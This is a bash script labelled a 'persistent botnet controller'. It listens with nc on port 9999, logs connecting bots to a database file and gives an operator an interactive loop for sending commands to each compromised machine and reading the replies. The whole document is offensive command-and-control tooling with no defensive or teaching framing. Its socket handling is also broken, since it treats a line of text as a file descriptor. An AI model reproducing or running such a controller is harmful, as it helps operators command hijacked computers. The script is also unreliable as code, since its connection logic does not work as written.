#!/bin/bash

PORT=9999
LOG_FILE="botnet.log"
BOT_DB="bots.db"

echo "Starting persistent botnet controller..."

# Initialize bot database
if [ ! -f "$BOT_DB" ]; then
    touch "$BOT_DB"
fi

# Function to handle bot connections
handle_connection() {
    local client_socket=$1
    local client_ip=$(echo "$client_socket" | cut -d: -f1)
    
    echo "$(date): New connection from $client_ip" >> $LOG_FILE
    
    # Read initial greeting from bot
    read greeting <&$client_socket
    local bot_name=$(echo "$greeting" | cut -d: -f1)
    
    echo "Bot $bot_name connected from $client_ip"
    
    # Add to database
    echo "$bot_name:$client_ip:$(date)" >> $BOT_DB
    
    # Interactive command loop
    while true; do
        echo -n "[$bot_name] Enter command (or 'exit' to quit): "
        read cmd
        
        if [ "$cmd" = "exit" ]; then
            break
        fi
        
        # Send command to bot
        echo "$bot_name:$cmd" >&$client_socket
        
        # Read response with timeout
        echo "Response from $bot_name:"
        while IFS= read -r response; do
            echo "$response"
            if [[ "$response" == *"command not found"* ]] || [[ -z "$response" ]]; then
                break
            fi
        done <&$client_socket
    done
    
    # Remove from database
    sed -i "/^$bot_name:/d" "$BOT_DB"
    exec {client_socket}>&-
    echo "$(date): Connection closed from $client_ip" >> $LOG_FILE
}

# Main loop
while true; do
    echo "Listening for bot connections on port $PORT..."
    
    # Create a temporary file for communication
    temp_file=$(mktemp)
    
    # Listen for connections and handle them
    nc -l -p $PORT > "$temp_file" &
    NC_PID=$!
    
    # Wait for connection
    sleep 2
    
    # Check if we got a connection
    if [ -s "$temp_file" ]; then
        # Extract connection info
        connection_info=$(head -1 "$temp_file")
        
        # Handle the connection
        handle_connection "$connection_info"
    fi
    
    # Clean up
    kill $NC_PID 2>/dev/null
    rm -f "$temp_file"
done
